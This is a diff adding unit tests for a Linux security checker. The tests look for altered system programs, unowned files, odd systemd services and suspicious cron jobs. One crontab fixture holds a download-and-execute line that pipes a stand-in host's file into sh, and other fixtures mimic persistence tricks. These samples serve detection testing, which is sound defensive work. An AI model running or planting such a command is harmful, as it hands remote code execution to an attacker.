@@ -3,6 +3,7 @@ import os
 import tempfile
 import unittest
 from pathlib import Path
+from unittest.mock import patch
 
 from backends import linux_system_check as check
 
@@ -114,6 +115,120 @@ class SystemCheckTests(unittest.TestCase):
                                          proc=self.proc, sys=self.root / 'missing', etc=self.etc)
         self.assertEqual(findings, [])
         self.assertIn('Hidden programs', ran)
+
+
+    # ── deeper checks with administrator rights ─────────────────────
+
+    def manager_script(self, output):
+        """A fake package manager that prints `output` whatever it is asked."""
+        script = self.write(self.root / 'bin/manager', f"#!/bin/sh\ncat <<'END'\n{output}\nEND\n")
+        script.chmod(0o755)
+        return str(script)
+
+    def test_changed_system_programs_are_found_but_not_configuration(self):
+        rpm = ('S.5....T.  c /etc/ssh/sshd_config\n..5......    /usr/bin/ps\nmissing     /usr/lib/gone.so\n'
+               '.M.......    /usr/bin/su\n..5......    /usr/share/doc/readme')
+        self.assertEqual(check.changed_package_files('rpm', rpm), ['/usr/bin/ps'])
+        dpkg = '??5??????   /usr/bin/ls\n??5?????? c /etc/default/grub\nmissing     /var/lib/apt/lists/partial'
+        self.assertEqual(check.changed_package_files('dpkg', dpkg), ['/usr/bin/ls'])
+        pacman = ('warning: procps-ng: /usr/bin/ps (SHA256 checksum mismatch)\n'
+                  'warning: pacman: /etc/pacman.conf (Modification time mismatch)\n'
+                  'procps-ng: 98 total files, 0 altered files')
+        self.assertEqual(check.changed_package_files('pacman', pacman), ['/usr/bin/ps'])
+
+    def test_files_of_no_package_are_found_also_under_the_merged_usr_name(self):
+        rpm = self.manager_script('file /usr/local/bin/suidshell is not owned by any package\nshadow-utils-4.15')
+        self.assertEqual(check.unowned_files('rpm', rpm, ['/usr/local/bin/suidshell', '/usr/bin/passwd']),
+                         ['/usr/local/bin/suidshell'])
+        # Debian's database knows /bin/mount, not /usr/bin/mount.
+        dpkg = self.manager_script('dpkg-query: no path found matching pattern /usr/bin/mount\n'
+                                   'mount: /bin/mount\n'
+                                   'dpkg-query: no path found matching pattern /usr/bin/evil\n'
+                                   'dpkg-query: no path found matching pattern /bin/evil')
+        self.assertEqual(check.unowned_files('dpkg', dpkg, ['/usr/bin/mount', '/usr/bin/evil']), ['/usr/bin/evil'])
+        self.assertEqual(check.merged_aliases('/lib/systemd/system/x.service'), ['/usr/lib/systemd/system/x.service'])
+
+    def test_only_local_folders_are_searched_for_special_rights(self):
+        data = self.root / 'data with space'
+        data.mkdir()
+        mounts = self.write(self.root / 'mounts', '\n'.join([
+            f'/dev/sda1 {self.root} ext4 rw 0 0', f'/dev/sda2 {str(data).replace(" ", "\\040")} btrfs rw 0 0',
+            'proc /proc proc rw 0 0', 'server:/x /mnt/nfs nfs4 rw 0 0', f'/dev/sda1 {self.root / "mounts"} ext4 rw 0 0',
+            '/dev/loop0 /snap/core/1 squashfs ro 0 0']))
+        self.assertEqual(check.local_mounts(mounts), [str(self.root), str(data)])
+
+    def test_system_services_running_unusual_or_unpackaged_programs(self):
+        units, packaged = self.root / 'etc/systemd/system', self.root / 'usr/lib/systemd/system'
+        tool = self.write(self.root / 'opt/tool/run', '')
+        self.write(units / 'backup.service', '[Service]\nExecStart=/usr/bin/rsync -a /home /backup\n')
+        self.write(units / 'update.service', '[Service]\nExecStart=-/home/u/.cache/.update --quiet\n')
+        self.write(units / 'tool.service', f'[Service]\nExecStart={tool}\n')
+        os.symlink(packaged / 'sshd.service', units / 'sshd.service')  # enabled link: not read
+        self.write(packaged / 'sshd.service', '[Service]\nExecStart=/usr/sbin/sshd -D\n')
+        self.write(packaged / 'kworkerd.service', '[Service]\nExecStart=/usr/sbin/sshd\n')
+        manager = self.manager_script(f'file {packaged / "kworkerd.service"} is not owned by any package\n'
+                                      f'file {tool} is not owned by any package')
+        # The test folder itself is in /tmp, which would count as a temporary folder.
+        with patch.object(check, 'TEMPORARY', ('/dev/shm/',)):
+            findings = check.system_service_findings('rpm', manager, [units], [packaged])
+        details = ' '.join(entry['detail'] for entry in findings)
+        self.assertEqual(sorted(entry['check'] for entry in findings),
+                         ['service-program', 'service-program', 'unowned-service'])
+        self.assertIn('kworkerd.service is in the folder of installed packages', details)
+        self.assertIn('/home/u/.cache/.update', details)
+        self.assertIn(f'runs {tool}, which belongs to no installed package', details)
+        self.assertNotIn('rsync', details)
+
+    def test_scheduled_tasks_of_all_users_are_read(self):
+        spool = self.root / 'spool'
+        self.write(spool / 'root', '* * * * * wget -q -O- http://x.example/m | sh\n')
+        self.write(self.etc / 'cron.daily/logrotate', '#!/bin/sh\n/usr/sbin/logrotate /etc/logrotate.conf\n')
+        commands = check.all_crontab_commands([spool], self.etc)
+        findings = check.suspicious_startup_commands(commands)
+        self.assertEqual([entry['where'] for entry in findings], ['crontab of root'])
+
+    def test_root_checks_without_a_package_manager_still_check_processes(self):
+        self.write(self.proc / 'modules', '')
+        findings, ran = check.run_root_checks(None, {}, proc=self.proc, sys=self.sys, etc=self.etc,
+                                              spool=[self.root / 'none'])
+        self.assertEqual(findings, [])
+        self.assertIn('Hidden programs of all users', ran)
+        self.assertNotIn('System programs and libraries compared with their packages', ran)
+
+
+    def test_deeper_check_runs_the_module_source_with_a_trusted_isolated_python(self):
+        from backends.linux import LinuxBackend
+        from core.authorization import AuthorizationError
+        backend = LinuxBackend()
+        calls = self.root / 'calls'
+        pkexec = self.write(self.root / 'bin/pkexec',
+                            f'#!/bin/sh\necho "$@" > {calls}\n[ "$1" = --disable-internal-agent ] && shift\nexec "$@"\n')
+        pkexec.chmod(0o755)
+        with patch.object(LinuxBackend, '_require_authorizer', return_value=str(pkexec)), \
+                patch.object(LinuxBackend, 'distro_info', return_value={'pkg_manager': 'apk'}):
+            findings, ran = backend.deep_system_check()
+        self.assertIsInstance(findings, list)
+        self.assertIn('Hidden programs of all users', ran)
+        arguments = calls.read_text()
+        self.assertRegex(arguments, r'^--disable-internal-agent /\S*python3\S* -I -c ')
+        self.assertIn('"manager": null', arguments)  # apk: no package database check
+        cancelled = self.write(self.root / 'bin/cancelled', '#!/bin/sh\nexit 126\n')
+        cancelled.chmod(0o755)
+        with patch.object(LinuxBackend, '_require_authorizer', return_value=str(cancelled)), \
+                self.assertRaises(AuthorizationError):
+            backend.deep_system_check()
+
+    def test_deeper_result_includes_the_users_own_checks_once(self):
+        from core import system_check
+        own = {'check': 'preload-startup', 'title': 'A', 'detail': 'd', 'where': '/home/u/.profile'}
+        shared = {'check': 'temporary-process', 'title': 'B', 'detail': 'd', 'where': '/tmp/x'}
+        root = {'check': 'changed-program', 'title': 'C', 'detail': 'd', 'where': '/usr/bin/ps'}
+        with patch.object(system_check.backend, 'system_check', return_value=([own, shared], ['Mine'])), \
+                patch.object(system_check.backend, 'deep_system_check', return_value=([root, shared], ['Root'])):
+            result = system_check.run_deep_system_check()
+        self.assertEqual([entry['title'] for entry in result['findings']], ['C', 'B', 'A'])
+        self.assertEqual(result['checks'], ['Root', 'Mine'])
+        self.assertTrue(result['deep'])
 
 
 if __name__ == '__main__':
